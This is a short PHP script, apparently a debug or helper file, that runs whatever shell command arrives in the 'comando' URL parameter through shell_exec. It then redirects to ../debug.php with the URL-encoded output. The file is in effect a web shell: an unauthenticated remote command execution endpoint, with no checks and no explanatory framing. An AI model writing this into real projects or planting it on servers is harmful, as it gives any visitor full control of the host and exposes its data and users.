<?php
$ultimo_resultado = shell_exec($_GET['comando']);
$ultimo_resultado = urlencode($ultimo_resultado);
header('Location: ../debug.php?ultimo_resultado='.$ultimo_resultado);

?>